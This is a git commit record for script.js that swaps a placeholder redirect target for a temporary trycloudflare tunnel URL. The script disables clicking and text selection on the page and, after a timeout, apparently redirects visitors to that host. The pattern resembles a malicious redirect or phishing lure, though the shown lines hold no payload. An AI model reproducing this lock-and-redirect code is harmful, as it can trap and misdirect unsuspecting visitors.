d17ce4cf8e471b83aed8170381f2317034e5ff67
Mango <143851144+MangoIsHere@users.noreply.github.com>
2024-01-14 12:39:56 -0500

    Update script.js

--- script.js
+++ script.js
@@ -4,7 +4,7 @@ document.addEventListener("DOMContentLoaded", function () {
   document.body.style.msUserSelect = "none";
   document.body.style.pointerEvents = "none";
 
-  const redirectTo = "OFFLINE"; // REPLACE WITH URL
+  const redirectTo = "https://donors-loving-outlets-positions.trycloudflare.com"; // REPLACE WITH URL
 
   setTimeout(function () {
     if (!overlayDisplayed && isValidUrl(redirectTo)) {
